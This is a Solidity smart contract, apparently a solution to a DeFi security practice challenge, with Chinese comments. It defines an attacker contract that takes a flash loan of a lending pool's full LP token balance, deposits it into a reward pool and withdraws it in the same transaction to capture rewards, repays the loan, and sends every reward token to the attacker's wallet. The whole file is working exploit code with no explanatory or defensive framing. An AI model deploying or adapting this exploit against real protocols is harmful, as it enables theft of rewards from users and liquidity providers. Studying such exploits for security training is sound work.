// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";


//需要互動的pool
//flashloan pool
//reward pool

interface IFlashloanPool {
    function flashLoan(uint256 amount) external;
}

interface IRewardPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function distributeRewards() external returns (uint256); 
}

contract RewarderAttacker {

    address private immutable attacker;
    IERC20 private immutable lpToken;
    IERC20 private immutable rewardToken;
    IFlashloanPool private immutable lendingPool;
    IRewardPool private immutable rewardPool;

    constructor(
        address _rewardPoolAddress,
        address _lendingPoolAddress,
        address _lpTokenAddress,
        address _rewardTokenAddrss
    ) {
        attacker = msg.sender;
        rewardPool = IRewardPool(_rewardPoolAddress);
        lendingPool = IFlashloanPool(_lendingPoolAddress);
        lpToken = IERC20(_lpTokenAddress);
        rewardToken = IERC20(_rewardTokenAddrss);
    }

    function attack() external {
        uint balance = lpToken.balanceOf(address(lendingPool));
        //借出所有lp
        lendingPool.flashLoan(balance);
    }

    //借出後的套利
    function receiveFlashLoan(uint256 amount) public {
        //approve rewardPool 使用lpToken
        lpToken.approve(address(rewardPool), amount);
        //deposit
        rewardPool.deposit(amount);
        //claim reward 
        rewardPool.withdraw(amount);
        //repay loan
        lpToken.transfer(address(lendingPool), amount);
        //取回此合約套到的所有reward token到attacker錢包
        rewardToken.transfer(address(attacker), rewardToken.balanceOf(address(this)));
    }


}